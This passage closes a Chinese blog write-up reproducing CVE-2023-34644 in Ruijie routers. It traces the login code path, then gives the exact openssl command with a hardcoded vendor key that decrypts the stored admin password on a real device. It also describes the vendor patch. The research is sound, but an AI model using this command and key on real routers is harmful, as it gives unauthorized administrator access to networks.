<h2 id="后续利用"><a href="#后续利用" class="headerlink" title="后续利用"></a>后续利用</h2><p>拿到路由器的最高权限后，也有一些后续的利用。比如拿管理员后台密码，劫持流量（抓取未加密的数据），修改 <code>ARP</code> 缓存表等等。因为本人只是一个正在学习相关知识的学生，对大部分的利用并不成熟，目前只记录拿到管理员后台密码的分析，后续如果有其他方面的进展，也会将细节进行补充</p>
<h3 id="拿到管理员后台密码"><a href="#拿到管理员后台密码" class="headerlink" title="拿到管理员后台密码"></a>拿到管理员后台密码</h3><p>在登录锐捷管理员后台的时候随便输入一个密码，点击登录</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309091227332.png" alt="image-20230909122721847"></p>
<p>用 <code>Burp</code> 拦截请求，发现下面的报文中 <code>method</code> 为 <code>login</code> </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309091231861.png" alt="image-20230909123105750"></p>
<p>这里的路径为 <code>/api/auth</code> ，根据代码 <code> entry(&#123;&quot;api&quot;, &quot;auth&quot;&#125;, call(&quot;rpc_auth&quot;), nil).sysauth = false</code> 可知会触发 <code>rpc_auth</code> 函数</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rpc_auth</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> jsonrpc = <span class="built_in">require</span> <span class="string">&quot;luci.utils.jsonrpc&quot;</span></span><br><span class="line">    <span class="keyword">local</span> http = <span class="built_in">require</span> <span class="string">&quot;luci.http&quot;</span></span><br><span class="line">    <span class="keyword">local</span> ltn12 = <span class="built_in">require</span> <span class="string">&quot;luci.ltn12&quot;</span></span><br><span class="line">    <span class="keyword">local</span> _tbl = <span class="built_in">require</span> <span class="string">&quot;luci.modules.noauth&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">tonumber</span>(http.<span class="built_in">getenv</span>(<span class="string">&quot;HTTP_CONTENT_LENGTH&quot;</span>) <span class="keyword">or</span> <span class="number">0</span>) &gt; <span class="number">1000</span> <span class="keyword">then</span></span><br><span class="line">        http.prepare_content(<span class="string">&quot;text/plain&quot;</span>)</span><br><span class="line">        <span class="comment">-- http.write(&#123;code = &quot;1&quot;, err = &quot;too long data&quot;&#125;)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;too long data&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    http.prepare_content(<span class="string">&quot;application/json&quot;</span>)</span><br><span class="line">    ltn12.pump.all(jsonrpc.handle(_tbl, http.source()), http.<span class="built_in">write</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>在 <code>jsonrpc.handle(_tbl, http.source())</code> 代码中，会根据 <code>method</code> 的值调用 <code>noauth.lua</code> 文件中对应的函数（具体的调用链参考上文 <a href="##lua%E6%96%87%E4%BB%B6%E7%9A%84%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90">lua文件代码分析</a>），这里就会调用 <code>login</code>  函数</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">local</span> disp = <span class="built_in">require</span>(<span class="string">&quot;luci.dispatcher&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> common = <span class="built_in">require</span>(<span class="string">&quot;luci.modules.common&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> tool = <span class="built_in">require</span>(<span class="string">&quot;luci.utils.tool&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> params.password <span class="keyword">and</span> tool.includeXxs(params.password) <span class="keyword">then</span></span><br><span class="line">        tool.eweblog(<span class="string">&quot;INVALID DATA&quot;</span>, <span class="string">&quot;LOGIN FAILED&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">local</span> authOk</span><br><span class="line">    <span class="keyword">local</span> ua = <span class="built_in">os</span>.<span class="built_in">getenv</span>(<span class="string">&quot;HTTP_USER_AGENT&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;unknown brower (ua is nil)&quot;</span></span><br><span class="line">    tool.eweblog(ua, <span class="string">&quot;LOGIN UA&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> checkStat = &#123;</span><br><span class="line">        password = params.password,</span><br><span class="line">        username = <span class="string">&quot;admin&quot;</span>, <span class="comment">-- params.username,</span></span><br><span class="line">        encry = params.encry,</span><br><span class="line">        limit = params.limit</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">local</span> authres, reason = tool.checkPasswd(checkStat)</span><br><span class="line">    <span class="keyword">local</span> log_opt = &#123;username = params.username, level = <span class="string">&quot;auth.notice&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> authres <span class="keyword">then</span></span><br><span class="line">        authOk = disp.writeSid(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line">        <span class="comment">-- 手动登录时设置时间</span></span><br><span class="line">        <span class="keyword">if</span> params.<span class="built_in">time</span> <span class="keyword">and</span> <span class="built_in">tonumber</span>(params.<span class="built_in">time</span>) <span class="keyword">then</span></span><br><span class="line">            common.setSysTime(&#123;<span class="built_in">time</span> = params.<span class="built_in">time</span>&#125;)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        log_opt.action = <span class="string">&quot;login-success&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        log_opt.action = <span class="string">&quot;login-fail&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    tool.write_log(log_opt)</span><br><span class="line">    <span class="keyword">return</span> authOk</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>上面的代码中，我们关注下检查密码的函数 <code>checkPasswd</code> （它的参数是一个叫做 <code>checkStat</code> 的表，其中包含了前端传入的加密后的密码），该函数定义在 <code>luci/utils/tool</code> 文件中</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 检测密码是否正确</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkPasswd</span><span class="params">(checkStat)</span></span></span><br><span class="line">    <span class="keyword">local</span> cmd = <span class="built_in">require</span>(<span class="string">&quot;luci.modules.cmd&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> _data = &#123;</span><br><span class="line">        <span class="built_in">type</span> = checkStat.encry <span class="keyword">and</span> <span class="string">&quot;enc&quot;</span> <span class="keyword">or</span> <span class="string">&quot;noenc&quot;</span>,</span><br><span class="line">        password = checkStat.password,</span><br><span class="line">        name = checkStat.username,</span><br><span class="line">        limit = checkStat.limit <span class="keyword">and</span> <span class="string">&quot;true&quot;</span> <span class="keyword">or</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">local</span> _check = cmd.devSta.get(&#123;<span class="built_in">module</span> = <span class="string">&quot;adminCheck&quot;</span>, device = <span class="string">&quot;pc&quot;</span>, data = _data&#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(_check) == <span class="string">&quot;table&quot;</span> <span class="keyword">and</span> _check.result == <span class="string">&quot;success&quot;</span> <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>, _check.reason</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>关键触发点是 <code>cmd.devSta.get(&#123;module = &quot;adminCheck&quot;, device = &quot;pc&quot;, data = _data&#125;)</code> </p>
<p>从 <code>lua</code> 文件中的代码 <code>cmd.devSta.get(&#123;module = &quot;adminCheck&quot;, device = &quot;pc&quot;, data = _data&#125;)</code> 执行后，会走到 <code>unifyframe-sgi.elf</code> 文件中，最后将 <code>/usr/sbin/module_call get adminCheck</code> 命令执行（这里的 <code>a1[5]</code> 代表操作符 <code>get</code>，<code>(v67+8)</code> 是<code>module</code> 字段的值 <code>adminCheck</code> ）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">        v70 = <span class="built_in">snprintf</span>(v66, v68, <span class="string">&quot;/usr/sbin/module_call %s %s&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)a1[<span class="number">5</span>], (<span class="type">const</span> <span class="type">char</span> *)(v67 + <span class="number">8</span>));</span><br><span class="line">        v71 = (<span class="type">const</span> <span class="type">char</span> *)a1[<span class="number">20</span>];</span><br><span class="line">        v72 = &amp;v66[v70];</span><br><span class="line">        <span class="keyword">if</span> ( v71 )</span><br><span class="line">          v72 += <span class="built_in">snprintf</span>(&amp;v66[v70], v68, <span class="string">&quot; &#x27;%s&#x27;&quot;</span>, v71);</span><br><span class="line">        v73 = a1[<span class="number">21</span>];</span><br><span class="line">        <span class="keyword">if</span> ( v73 )</span><br><span class="line">          <span class="built_in">snprintf</span>(v72, v68, <span class="string">&quot; %s&quot;</span>, v73);</span><br><span class="line">......</span><br><span class="line">ufm_commit_add(<span class="number">0</span>, v66, <span class="number">1u</span>, <span class="number">0</span>)<span class="comment">//然后切换到其他线程上将 v66 命令给执行</span></span><br></pre></td></tr></table></figure>



<p>下面来分析 <code>/usr/sbin/module_call</code> 文件代码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">ROM_AC_CONFIG_DIR=&quot;/rom/etc/rg_config/global/&quot;</span><br><span class="line">ROM_DEV_CONFIG_DIR=&quot;/rom/etc/rg_config/single/&quot;</span><br><span class="line">RG_CONFIG_TMP_DIR=&quot;/tmp/rg_config/&quot;</span><br><span class="line">cmd=&quot;$1&quot;</span><br><span class="line">module=&quot;$2&quot;</span><br><span class="line">param=&quot;$3&quot;</span><br><span class="line">path=&quot;$4&quot;</span><br><span class="line">register_module() &#123;</span><br><span class="line">    local module=$1</span><br><span class="line">    local module_file</span><br><span class="line">    </span><br><span class="line">    module_file=&quot;/usr/bin/$module&quot;</span><br><span class="line">    if [ -f &quot;$module_file&quot; ]; then</span><br><span class="line">        . &quot;$module_file&quot;</span><br><span class="line">    else</span><br><span class="line">        return 1</span><br><span class="line">    fi</span><br><span class="line">    return 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init() &#123;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">get_default() &#123;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">register_module &quot;$module&quot;</span><br><span class="line">if [ $? = 1 ]; then</span><br><span class="line">    return 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">for arg in $* ;do</span><br><span class="line">    if [ &quot;$arg&quot; == &quot;-n&quot; ];then</span><br><span class="line">        not_change_configId=$arg</span><br><span class="line">    fi</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">case &quot;$cmd&quot; in</span><br><span class="line">    set|add|del|update|apply) $&#123;module&#125;_$&#123;cmd&#125; &quot;$&#123;param&#125;&quot; &quot;$path&quot; &quot;$&#123;not_change_configId&#125;&quot; 2&gt; /dev/null;;</span><br><span class="line">    getDefault)    get_default &quot;$module&quot; &quot;$param&quot;;;</span><br><span class="line">    get)  $&#123;module&#125;_get &quot;$&#123;param&#125;&quot;;;</span><br><span class="line">    *)      ;;</span><br><span class="line">esac</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>cmd=&quot;$1&quot;</code> <code>module=&quot;$2&quot;</code> 这里将字符串 <code>get</code> 和 <code>adminCheck</code> 分别赋给了 <code>cmd</code> <code>module</code> 变量</p>
<p>首先执行了 <code>register_module &quot;$module&quot;</code> ，简单分析一下 <code>register_module</code> 可知其在判断 <code>/usr/bin/adminCheck</code> 文件是否存在，如果不存在的话 <code>module_call</code> 文件的执行就结束了，存在的话对 <code>/usr/bin/adminCheck</code> 模块进行加载（将该文件中的代码合并到当前 <code>shell</code> 进程中，从而加载了函数和变量）</p>
<p>随后调用了 <code>for</code> 循环，来遍历脚本的命令行参数是否有 <code>-n</code> （当前分析的这个链并没有），最终关键代码为下面的 <code>case</code> 语句，如果匹配到了 <code>set</code>  <code>add </code> <code>del</code> <code>update</code> <code>appley</code> 中的任何一个，就会执行 <code>$&#123;module&#125;_$&#123;cmd&#125; &quot;$&#123;param&#125;&quot; &quot;$path&quot; &quot;$&#123;not_change_configId&#125;&quot; 2&gt; /dev/null</code> 也就是 <code>adminCheck_get 2&gt; /dev/null</code> </p>
<p><code>adminCheck_get</code> 为 <code>/usr/bin/adminCheck</code> 文件中的函数，主要作用是调用了函数 <code>adminCheck_parse</code> ，其关键的代码部分如下。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">json_get_var password &quot;password&quot;</span><br><span class="line">......</span><br><span class="line">local ciphertext=$(cat /etc/rg_config/admin)	</span><br><span class="line">local passwd_old=`deenc &quot;$ciphertext&quot;`</span><br><span class="line">......</span><br><span class="line">if [ &quot;$passwd_old&quot; = &quot;$password&quot; ]</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">deenc()</span><br><span class="line">&#123;</span><br><span class="line">	local passwd=$1</span><br><span class="line">	echo &quot;$passwd&quot;| /usr/sbin/rg_crypto dec -t C</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过上面的代码可知，管理员后台密码加密后存放在 <code>/etc/rg_config/admin</code> 文件中，直接执行 <code>echo &quot;$passwd&quot;| /usr/sbin/rg_crypto dec -t C</code> 命令就能得到解密后的管理员后台密码。</p>
<p>下面用真机演示一下（我用的设备型号是 <code>EW1200G-PRO</code> ，软件版本是 <code>EW_3.0(1)B11P25,Release(07162402)</code>） ，我看了一下这个 <code>/usr/bin/adminCheck</code> 的文件，发现它的解密和上面并不一样，这里执行的应该是 <code>echo &quot;$passwd&quot;| openssl enc -aes-256-cbc -d -a -k &quot;RjYkhwzx\$2018!&quot;</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309121052534.png" alt="image-20230912105245882"></p>
<p>最后执行命令如下，得到管理员密码为 <code>88888888</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309121055168.png" alt="image-20230912105533075"></p>
<h2 id="补丁："><a href="#补丁：" class="headerlink" title="补丁："></a>补丁：</h2><p>官方在 <code>EW_3.0(1)B11P226</code> 版本，对上述漏洞发布了补丁   <a target="_blank" rel="noopener" href="https://www.ruijie.com.cn/fw/rj/92255/">https://www.ruijie.com.cn/fw/rj/92255/</a></p>
<p>新添加了一个 <code>detect_remoteIp_invalid</code> 函数，该函数检查了 <code>remoteIP</code> 字段是否为纯数字或者字符 <code>.</code> ，因为正常的 <code>IP</code> 应该为 <code>xx.xx.xx.xx</code> 。这相当于对命令注入的字段做了一个过滤</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">detect_remoteIp_invalid</span><span class="params">(<span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> len; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// $v1</span></span><br><span class="line"></span><br><span class="line">  len = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  v3 = buf;</span><br><span class="line">  v4 = &amp;buf[len];</span><br><span class="line">  <span class="keyword">while</span> ( v3 != v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = *v3;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)(v5 - <span class="number">48</span>) &lt; <span class="number">0xA</span>u )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      ++v3;</span><br><span class="line">      <span class="keyword">if</span> ( v5 != <span class="string">&#x27;.&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        uf_log_printf(</span><br><span class="line">          uf_log,</span><br><span class="line">          <span class="string">&quot;ERROR (%s %s %d)invalid char: %c, need [number][.][number]!&quot;</span>,</span><br><span class="line">          <span class="string">&quot;sgi.c&quot;</span>,</span><br><span class="line">          <span class="string">&quot;detect_remoteIp_invalid&quot;</span>,</span><br><span class="line">          <span class="number">273</span>,</span><br><span class="line">          v5);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p>对于 <strong>CVE-2023-34644</strong> 的复现结束了，这个漏洞的复现从开始到结束历经了一个多月（与此同时还有 <strong>CVE-2023-38902</strong> 的研究）。期间碰到了很多奇怪的报错以及思考时产生的疑问，比起 <strong>CVE-2023-20073</strong> 的复现，这次自己进行了更多的思考。再次要特别感谢 <strong>winmt</strong> 师傅，关于 <strong>CVE-2023-34644</strong> 的大部分关键点其实 <strong>winmt</strong> 已经写的很详细了。但是在复现的过程中，对于我这个初学者来说，依然有很多的问题感到一知半解，有不少地方经过尝试后依然没有思路，都想得过且过，认为此处理解的不透彻也并不影响整体的分析。可在细节上得过且过，真的在独立的漏洞挖掘中有所高质量的产出么？扪心自问，我不认为会有高质量的产出。比如在上文提到的信号量触发 <code>uf_cmd_call</code> 函数，不追踪到底的话，我只知道有个地方肯定操作了信号量导致了 <code>uf_cmd_call</code> 执行，但具体是哪里操作的信号量呢？<code>IDA</code> 显示不完整的情况下，探究的过程并不容易。如果不知道具体哪里操作的信号量，我就不能说完全弄清了整个的漏洞调用链，那复现一个漏洞连完整的触发调用链都没搞清，那复现的意义到底是什么呢？在复现的过程中都是一知半解，那在真实环境下进行独立的漏洞挖掘，找漏洞又何从谈起呢，甚至于找到了漏洞，但是连怎么走到漏洞点都分析不明白。感谢 <strong>winmt</strong> 多次 <strong>“push”</strong> ，让我没有得过且过。对于学习而言，可能比起当前暂时领先于常人的能力和知识而言，对 产生的问题始终保持好奇 和 “再试一次”的精神 更为重要和难得。</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-277386.htm#msg_header_h2_4">https://bbs.kanxue.com/thread-277386.htm#msg_header_h2_4</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zujipi8736/article/details/86606093">https://blog.csdn.net/zujipi8736/article/details/86606093</a></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/MIPS%E6%9E%B6%E6%9E%84/" rel="tag"># MIPS架构</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/posts/848296ab.html" rel="prev" title="从零开始复现CVE-2023-20073">
                  <i class="fa fa-chevron-left"></i> 从零开始复现CVE-2023-20073
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/posts/c039484.html" rel="next" title="SynGDB--同步GDB调试的IDA小插件">
                  SynGDB--同步GDB调试的IDA小插件 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2023</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">ZIKH26</span>
  </div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>





  <script src="/js/third-party/pace.js"></script>


  





</body>
</html>
